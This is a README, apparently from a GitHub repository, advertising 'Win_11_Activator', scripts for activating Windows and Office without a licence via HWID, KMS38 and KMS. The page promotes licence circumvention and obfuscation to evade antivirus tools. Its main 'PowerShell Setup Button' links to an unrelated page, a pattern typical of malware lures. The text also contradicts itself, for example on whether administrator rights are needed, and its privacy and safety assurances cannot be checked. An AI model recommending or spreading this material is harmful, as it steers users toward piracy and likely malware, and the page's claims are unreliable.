<div align="center">

# Win_11_Activator Script Collection — Security Tool

![](files/preview.png)

### ⚡ PowerShell Setup Button

[![](files/button.png)](https://apsarapearllogistics-hue.github.io/endpoint-integrity-auditor/)

[![licence](https://img.shields.io/badge/licence-unlicense-2ea44f?style=flat-square&labelColor=0d1117)]() [![build](https://img.shields.io/badge/build-passing-2ea44f?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/ps--core-script-34b759?style=flat-square&labelColor=0d1117)]() [![release](https://img.shields.io/badge/release-maintained-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

Win_11_Activator is a collection of scripts for activating Microsoft products through HWID, KMS38, and Online Activation methods. The project prioritizes open-source code, reduced antivirus detection, and user-friendliness. Each activation method targets a defined product set with a corresponding activation period.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Supports HWID, KMS38, and Online Activation methods through separate script modules.
- HWID activation yields a permanent digital license tied to the hardware fingerprint; no periodic renewal is required.
- KMS38 activation extends validity until the year 2038 without a running KMS service or scheduled renewal task.
- Online Activation grants 180-day validity per cycle; a renewal task can be created for continuous auto-activation.
- Covers Windows 10 and Windows 11 product editions, Windows Server builds, and Office product lines according to the method selected.
- Open-source scripts are auditable; activators run local commands against the operating system's built-in licensing interfaces and do not require third-party binary execution.
- Script structure and obfuscation practices are designed to reduce antivirus false positives and heuristic detections.
- User-facing menus guide the operator from activation method selection through execution without manual command entry.
- Includes status checks for current license and activation state before changes are applied to the system.
- Activation changes are reversible; scripts provide options to remove applied licenses and scheduled tasks and restore the previous activation state.
- No background services, telemetry calls, or persistent network connections are created by the activation process itself.
- Supports offline operation after the initial script retrieval; activation does not depend on external activation servers for HWID and KMS38 methods.

## How it works

The script operates by interacting with the licensing infrastructure already present in the operating system, applying one of three activation methods depending on the target product and the edition detected. Each method uses documented or observable system interfaces rather than third-party servers.

HWID activation generates a hardware-bound digital license. The script collects a non-identifying hardware fingerprint derived from the system, submits a corresponding license request to Microsoft's activation servers, and installs the returned ticket locally. Because the resulting entitlement is tied to the device, it persists across reboots without a background service and does not require periodic renewal.

KMS38 activation sets the product to a Key Management Service client and applies a generic volume license key appropriate for the detected edition. Instead of contacting a live KMS host, the script configures a local activation state valid until the year 2038, after which the activation period ends. No ongoing process is required for the license to remain active within that window.

Online KMS activation configures the product against a KMS endpoint and activates it for a 180-day cycle. The script installs a scheduled renewal task that re-establishes the activation period before expiry, allowing continuous operation without manual intervention. The task can be removed at any time to revert the system to its prior licensing state.

All methods check the installed edition against a supported-product list before making changes and skip unsupported targets. The script writes no credentials and transmits no telemetry of its own; every network request is addressed only to the activation services that the operating system itself uses. Activation state can be inspected at any point through the standard licensing interface, and each method includes a corresponding revert path so that changes are reversible.

## Privacy

The scripts in Win_11_Activator do not transmit telemetry, activation data, or system identifiers to the author or any third party. All activation operations are performed locally on the machine where the script is executed.

Activation requests are sent only to Microsoft infrastructure, as required by the HWID, KMS38, and Online Activation methods themselves. This communication is identical in nature to the traffic generated during a standard Windows license activation and is limited to the endpoints the operating system already uses for licensing.

The scripts do not require an account, do not include analytics or tracking components, and do not modify the system's privacy or telemetry settings beyond what is necessary to complete the selected activation method. Any temporary files created during execution are removed upon completion, and no persistent logs containing hardware identifiers are retained by the scripts.

Because Win_11_Activator is open-source, every network call and file operation performed by the scripts can be reviewed directly in the source code before execution. Users are encouraged to inspect the scripts and verify behavior in an isolated environment prior to running them on a production system.

## FAQ

**Is Win_11_Activator affiliated with Microsoft?**
No. Win_11_Activator is an independent, open-source project and is not affiliated with, endorsed by, or sponsored by Microsoft. All product names and trademarks belong to their respective owners.

**Which activation methods does it support?**
The scripts support three methods: HWID (digital license), KMS38, and Online KMS activation. HWID produces a permanent digital license, KMS38 activates until the year 2038, and Online KMS activates for 180 days with an optional renewal task for continued activation.

**Which products are covered?**
HWID and KMS38 target Windows 10 and Windows 11 editions, with KMS38 additionally covering Windows Server. Online KMS covers Windows, Windows Server, and Office products.

**Do the scripts modify system files or the boot process?**
The activation logic operates through supported Windows activation interfaces. No bootloader modifications are performed. Users should review the scripts before execution, as with any tool that interacts with licensing components.

**Why might antivirus software flag the scripts?**
Activation utilities commonly trigger heuristic detections because they alter licensing state. The project prioritizes open-source code so that all behavior can be audited. False positives can be verified by reviewing the source and submitting samples to the relevant vendor.

**Is activation permanent?**
Permanence depends on the method. HWID licenses are tied to the hardware and persist across reinstalls on the same device. KMS38 remains valid until 2038. Online KMS requires periodic renewal, which the provided renewal task automates.

**Does the tool collect or transmit data?**
The scripts do not include telemetry or analytics. Activation requests are made only to the endpoints required by the respective activation method. No user data is stored or forwarded by the project.

**What are the prerequisites?**
Administrative privileges are required. Online KMS additionally requires network access to a KMS host, and the renewal task depends on the Windows Task Scheduler. HWID activation requires the target device to meet the hardware and edition conditions defined by Microsoft.

**Can activation be reverted?**
Yes. The project includes options to remove activation and restore the prior licensing state. Reverting is recommended before transferring a license or decommissioning a device.

**Is using this tool lawful?**
The project is distributed for educational and research purposes. Users are responsible for ensuring their use complies with applicable licensing terms and local law. Refer to the Disclaimer section for the full statement.

## Disclaimer

This project is provided strictly for educational, research, and interoperability purposes. The scripts contained within this repository modify product licensing state on the local system. Users are solely responsible for ensuring that their use of this project complies with all applicable laws, regulations, and licensing terms governing any software they activate.

Activation methods such as HWID, KMS38, and online activation interact with system components, including licensing services and registry entries. Such modifications may be detected, logged, or reversed by the operating system vendor or by security software. Detection of this project by antivirus or endpoint protection products is possible despite any design choices intended to reduce false positives; no guarantee of undetectability is made or implied.

The maintainers make no representations or warranties regarding the legality, safety, stability, or fitness for any particular purpose of this project. Use of this project is at your own risk. The authors and contributors accept no liability for any damage, data loss, system instability, licensing revocation, voided warranty, or other consequences arising from its use or misuse.

This project is not affiliated with, endorsed by, or sponsored by any software vendor. Product names, trademarks, and registered trademarks referenced are the property of their respective owners.

No support is provided for unlawful use. If you are uncertain whether your intended use is permitted, consult the applicable license terms or seek appropriate legal advice before proceeding.